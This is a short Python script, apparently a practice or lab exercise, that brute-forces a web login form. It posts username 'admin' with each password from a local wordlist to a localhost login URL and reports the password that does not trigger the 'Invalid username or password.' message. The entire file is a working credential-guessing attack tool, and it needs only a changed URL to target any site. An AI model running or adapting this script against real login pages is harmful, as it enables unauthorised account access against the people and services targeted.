import requests

# define the webpage you want to crack

# this page must be a login page with a username and password

url = "http://localhost:8081/login"

# let's get the username

#login = input("What is the username you wish to attempt? ")
login="admin"

# next, let's get the password file

#password_file = input("Please enter the name of the password file: ")

# open the password file in read mode

file = open("C:\\FEKT\\passwords.txt", "r")

# now let's get each password in the password_file

for password in file.readlines():

# let's strip it of any \n


   password = password.strip("\n")

# collect the data needed from "inspect element"

   data = {'login':login, 'password':password, "submit":'submit'}

   send_data_url = requests.post(url, data=data)

   if "Invalid username or password." in str(send_data_url.content):

      print("[*] Attempting password: %s" % password)

   else:

      print("[*] Password found: %s " % password)
